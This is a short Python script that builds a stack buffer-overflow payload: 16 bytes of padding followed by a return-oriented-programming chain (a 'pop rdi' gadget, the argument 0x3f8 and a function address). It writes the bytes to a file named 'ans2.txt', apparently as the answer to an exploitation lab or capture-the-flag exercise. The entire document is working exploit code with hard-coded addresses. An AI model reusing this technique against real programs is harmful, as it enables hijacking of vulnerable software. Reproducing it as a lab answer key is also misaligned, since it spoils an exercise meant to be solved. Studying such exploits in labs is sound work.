import struct

padding = b'A' * 16

pop_rdi_addr = 0x4012c7  

arg1 = 0x3f8


func2_addr = 0x401216

rop_chain = struct.pack('<Q', pop_rdi_addr) + struct.pack('<Q', arg1) +  struct.pack('<Q', func2_addr)

payload = padding + rop_chain

with open("ans2.txt", "wb") as f:
    f.write(payload)
